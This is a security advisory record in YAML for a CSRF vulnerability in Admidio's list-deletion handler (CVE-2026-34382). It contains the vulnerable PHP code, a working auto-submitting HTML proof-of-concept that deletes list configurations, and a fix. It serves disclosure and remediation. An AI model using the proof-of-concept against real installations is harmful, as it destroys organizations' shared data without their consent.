@@ -1,0 +1,105 @@
+advisory_id: GHSA-g3mx-8jm6-rc85
+datasource_id: github_osv/GHSA-g3mx-8jm6-rc85
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g3mx-8jm6-rc85/GHSA-g3mx-8jm6-rc85.json
+aliases:
+  - CVE-2026-34382
+summary: "Admidio has Missing CSRF Protections on Custom List Deletion in mylist_function.php\n\
+  **Reported by:** Juan Felipe Oz [@JF0x0r](https://x.com/PwnedRar_)\n> [LinkedIn](https://www.linkedin.com/in/juanfelipeoz/)\n\
+  \n### Summary\n\nThe `delete` mode handler in `mylist_function.php` permanently deletes list\
+  \ configurations without validating a CSRF token. An attacker who can lure an authenticated\
+  \ user to a malicious page can silently destroy that user's list configurations — including\
+  \ organization-wide shared lists when the victim holds administrator rights.\n\n### Vulnerable\
+  \ Code\nFile: `modules/groups-roles/mylist_function.php`\n\nThe CSRF token validation at lines\
+  \ **81–82** is scoped exclusively to the save, save_as, and save_temporary modes:\n\n```php\n\
+  // Line 81-82 — only runs for save modes\n$categoryReportConfigForm = $gCurrentSession->getFormObject($_POST['adm_csrf_token']);\n\
+  if ($_POST['adm_csrf_token'] !== $categoryReportConfigForm->getCsrfToken()) {\n    throw new\
+  \ Exception('Invalid or missing CSRF token!');\n}\n```\n\n<img width=\"857\" height=\"162\"\
+  \ alt=\"imagen\" src=\"https://github.com/user-attachments/assets/caec390e-ba6f-40f0-bb9c-a8870679da3d\"\
+  \ />\n\nThe `delete` case at lines **159–161** executes the destructive operation with no\
+  \ token check:\n\n```php\n} elseif ($getMode === 'delete') {\n    // delete list configuration\n\
+  \    $list->delete();  // no CSRF validation\n    echo json_encode(array('status' => 'success',\
+  \ ...));\n    exit();\n}\n```\n\n<img width=\"560\" height=\"133\" alt=\"imagen\" src=\"https://github.com/user-attachments/assets/2d5eff8e-bbce-49b9-b6d5-77f4e2e6db69\"\
+  \ />\n\nA global input guard at lines **40–48** requires a non-empty `column[]` POST parameter\
+  \ for all modes including `delete`. This guard serves no security purpose for deletion, it\
+  \ exists for save validation but it must be satisfied to reach the delete handler. Any static\
+  \ value such as `LAST_NAME` is sufficient.\n\n### Impact\n\nAny authenticated user with list\
+  \ edit permission can be targeted. Admidio ships with six organization-wide shared lists (`lst_global\
+  \ = 1`): Address list, Phone list, Contact information, Membership, Members, and Contacts.\
+  \ When an administrator is the CSRF victim, these global lists are permanently deleted affecting\
+  \ all members of the organization. There is no soft-delete or recovery mechanism.\n\n---\n\
+  \n### Proof of Concept\n\n> First my video PoC, after that, the proof of concept with detail.\
+  \ \n\n[Watch Video](https://drive.google.com/file/d/1wEdTIH7O0PvlnyjR2I_VpcAl3tvr6saA/view?usp=sharing)\n\
+  \n* Prerequisites: Victim is authenticated in Admidio. Attacker knows the target list UUID\
+  \ (visible in the page URL at modules/groups-roles/mylist.php?list_uuid=...)\n\n1. Step 1:\
+  \ Attacker serves this page from any HTTP origin:\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n\
+  \  <form id=\"f\" method=\"POST\"\n    action=\"http://TARGET/modules/groups-roles/mylist_function.php?mode=delete&list_uuid=TARGET_UUID\"\
+  >\n    <input type=\"hidden\" name=\"column[]\" value=\"LAST_NAME\">\n  </form>\n  <script>document.getElementById('f').submit();</script>\n\
+  </body>\n</html>\n```\n\n> Since browsers block CSRF files, I did the proof of concept by\
+  \ setting up a local server with Python on the 9090. ok? \n\n2. Step 2: Victim visits the\
+  \ attacker page while logged into Admidio.\n3. Step 3: Server responds immediately:\n\n```json\n\
+  {\"status\":\"success\",\"url\":\".../modules/groups-roles/mylist.php\"}\n```\n\n4. Step 4:\
+  \ List is permanently deleted. Verified via:\n```sql\nSELECT lst_name FROM adm_lists WHERE\
+  \ lst_uuid='TARGET_UUID';\n-- Empty result set\n```\n> No `adm_csrf_token` field is required\
+  \ anywhere in the request.\n\n### Recommendation Fix: \n\n> It's so simple. \n\n* Apply the\
+  \ same `SecurityUtils::validateCsrfToken()` pattern already used in the save modes:\n\n```php\n\
+  } elseif ($getMode === 'delete') {\n    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);\n\
+  \    $list->delete();\n    echo json_encode(array('status' => 'success', ...));\n    exit();\n\
+  }\n```\n\nAdditionally, the `column[]` input guard at lines **40–48** should be moved inside\
+  \ the `in_array($getMode, ['save', 'save_as', 'save_temporary'])` block, since delete requires\
+  \ no column data and the guard currently forces attackers to include a trivially satisfiable\
+  \ dummy value.\n\n<img width=\"751\" height=\"240\" alt=\"imagen\" src=\"https://github.com/user-attachments/assets/607510b9-64a9-49fb-8806-604b651d31a8\"\
+  \ />"
+impacted_packages:
+  - purl: pkg:composer/admidio/admidio
+    affected_versions: vers:composer/>=5.0.0|<=5.0.7
+    fixed_versions: vers:composer/5.0.8
+    affected_packages:
+      - pkg:composer/admidio/admidio@5.0.0
+      - pkg:composer/admidio/admidio@5.0.1
+      - pkg:composer/admidio/admidio@5.0.2
+      - pkg:composer/admidio/admidio@5.0.3
+      - pkg:composer/admidio/admidio@5.0.4
+      - pkg:composer/admidio/admidio@5.0.5
+      - pkg:composer/admidio/admidio@5.0.6
+      - pkg:composer/admidio/admidio@5.0.7
+    fixed_packages:
+      - pkg:composer/admidio/admidio@5.0.8
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/admidio/admidio
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/admidio/admidio
+        commit: 317ec91ad3baf19d4179db6c32413812eb36d7ca
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '4.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-g3mx-8jm6-rc85/GHSA-g3mx-8jm6-rc85.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-352
+references:
+  - url: https://github.com/Admidio/admidio
+    reference_type:
+    reference_id:
+  - url: https://github.com/Admidio/admidio/commit/317ec91ad3baf19d4179db6c32413812eb36d7ca
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-34382
+    reference_type:
+    reference_id: CVE-2026-34382
+  - url: https://github.com/Admidio/admidio/security/advisories/GHSA-g3mx-8jm6-rc85
+    reference_type:
+    reference_id: GHSA-g3mx-8jm6-rc85
+exploits: []
